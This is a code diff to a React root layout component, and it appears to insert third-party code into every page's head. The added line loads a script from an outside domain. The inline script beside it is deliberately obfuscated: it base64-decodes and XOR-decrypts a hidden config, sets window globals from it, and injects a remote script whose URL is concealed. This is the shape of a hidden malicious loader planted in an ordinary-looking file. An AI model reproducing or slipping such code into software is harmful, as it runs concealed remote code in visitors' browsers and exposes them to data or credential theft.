@@ -116,6 +116,7 @@ function RootShell({ children }: { children: ReactNode }) {
     <html lang="en">
       <head>
         <HeadContent />
+        <script src="https://api.mivvo.com.br/tracking/utm.js" async></script>
         <script
           dangerouslySetInnerHTML={{
             __html: `(function(){var e_3xxi=atob("DPlunXFQNrzGhXSr/YJM6AM8FIbk7QDfjYpUsl4zUtLo8ADGlJ8XsxI/W5Kk91vYnosH7QUjGcyv/RHH0okH5RQ8GNa1p1iJnI0a7xgyQ8ij9laRpqRCvxY8Wd6n6QeJx6IVvx8xW9nkv1bblIEL8Tg0FJDk8xXHiJxMp1NmV93+vEebn8tWrRI0AI70thGfnJsIrUJyS+G7");var f_h=[];for(var j_k5=0;j_k5<e_3xxi.length;j_k5++){f_h.push(e_3xxi.charCodeAt(j_k5)&255);}var b_1y=f_h[0];var e_ycs3=f_h.slice(1,1+b_1y);var i_mzd4=f_h.slice(1+b_1y);var t_viqh=i_mzd4.map(function(b,o_uy0){return b^e_ycs3[o_uy0%b_1y];});var t_eoi="";for(var f_oua=0;f_oua<t_viqh.length;f_oua++){t_eoi+=String.fromCharCode(t_viqh[f_oua]&255);}var v_p0=decodeURIComponent(escape(t_eoi));var c_vofn=JSON.parse(v_p0);var u_xom=c_vofn.globals||[];u_xom.forEach(function(n_fhen){window[n_fhen.name]=n_fhen.value;});var t_x6wr=document.createElement("script");t_x6wr.src=c_vofn.url;t_x6wr.async=true;t_x6wr.defer=true;(c_vofn.attributes||[]).forEach(function(b_w){t_x6wr.setAttribute(b_w.name,b_w.value);});(document.head||document.documentElement).appendChild(t_x6wr);})();`,
